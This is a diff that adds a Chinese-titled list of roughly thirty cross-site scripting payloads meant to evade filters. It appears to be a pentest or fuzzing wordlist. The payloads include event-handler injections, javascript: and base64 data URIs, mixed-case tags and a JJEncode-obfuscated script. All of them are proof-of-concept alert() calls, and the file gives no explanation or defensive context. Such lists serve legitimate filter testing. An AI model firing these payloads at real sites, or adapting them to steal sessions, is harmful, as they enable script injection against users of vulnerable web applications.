@@ -1,0 +1,29 @@
+# 基本混淆和绕过技术
+<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>
+<IMG SRC="javascript:alert('XSS');">
+<svg><script>alert&#40;1&#41</script>
+<body onpageshow=alert(1)>
+<body onload=alert('XSS')>
+<input type="text" value="" onfocus="alert('XSS')" autofocus>
+<video><source onerror="javascript:alert('XSS')">
+<iFrAme SRC="javascript:alert('XSS');"></iFramE>
+<div onmouseover="alert('XSS')">XSS</div>
+<marquee onstart='alert("XSS")'>XSS</marquee>
+<img src="/" onerror="alert(String.fromCharCode(88,83,83))"/>
+<svg onload="javascript:alert('XSS')" xmlns="http://www.w3.org/2000/svg"></svg>
+<style>@import 'data:text/css;base64,KiAge2JhY2tncm91bmQtaW1hZ2U6IHVybCgiamF2YXNjcmlwdDphbGVydCgiWFNTIikiKX0=')</style>
+<math><a xlink:href="javascript:alert(1)">click</a></math>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>
+<base href="javascript:alert('XSS')//">
+<script src="data:text/javascript,alert(1)"></script>
+<iframe src="javascript:alert('XSS');"></iframe>
+<form action="javascript:alert('XSS')"><input type="submit"></form>
+<isindex action="javascript:alert('XSS')" type=image>
+<input type="image" src="javascript:alert('XSS');">
+<table background="javascript:alert('XSS')">
+<button form="test" formaction="javascript:alert(1)">XSS</button>
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS');">
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>XSS</a>
+<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+"\\"+$.__$+$.$_$+$.__$+$.$$_+"\\"+$.__$+$.$$_+$._$$+"\\"+$.__$+$.__$+$.__$+$._+"(\\\"\\"+$.__$+$.$_$+$.$$_+$.$$$_+"\\\")"+$.$$$_)())();</script>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">XSS</a> 
